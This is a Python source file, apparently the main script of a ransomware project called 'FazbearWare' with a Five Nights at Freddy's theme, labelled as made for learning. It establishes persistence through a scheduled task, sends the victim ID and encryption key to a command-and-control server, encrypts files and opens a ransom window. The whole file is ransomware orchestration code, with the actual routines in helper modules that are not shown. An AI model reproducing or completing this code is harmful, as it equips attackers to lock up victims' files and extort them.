#This Code was maded only for edicational and learning purposes, i wanted to learn how ransomware works 

from cryptography.fernet import Fernet 
import persistence
import victim_ID
import encrypt
import ransom_window_UI

key = Fernet.generate_key() #KEY TO ENCRYPT AND DECRYPT 
def run_fazbearware():
    print("""
    [!] FazbearWare Framework Loading...
    [!] Educational purposes only.
    """)

    # 1. ESTABLISH PERSISTENCE
    # Crea la tarea programada para asegurar el inicio con el sistema
    print("[*] Configuring system persistence...")
    try:
        persistence.task("FazbearEngine_Update")
        print("[+] Persistence task created successfully.")
    except Exception as e:
        print(f"[-] Skip persistence: {e}")

    # 2. C2 REGISTRATION
    # Envía la llave y los detalles del sistema al servidor ANTES de cifrar
    print("[*] Connecting to C2 Server...")
    try:
        victim_ID.send_to_c2()
        print("[+] Victim ID and Fernet Key synced with database.")
    except Exception as e:
        # En un ransomware real, a veces se detiene aquí si no hay conexión,
        # pero para pruebas seguiremos adelante.
        print(f"[!] C2 Connection failed: {e}. Proceeding with offline encryption.")

    # 3. EXECUTE ENCRYPTION
    # Realiza el cifrado en la ruta test_path definida en encrypt.py
    print("[*] Initiating encryption process...")
    try:
        encrypt.encrypt_path()
        print("[+] Encryption cycle complete.")
    except Exception as e:
        print(f"[X] Critical error during encryption: {e}")

    # 4. DEPLOY RANSOM UI
    # Lanza la ventana de Freddy Fazbear con la música y la nota de rescate
    print("[!] Deployment finished. Launching UI...")
    ransom_window_UI.window.mainloop()

if __name__ == "__main__":
    run_fazbearware()

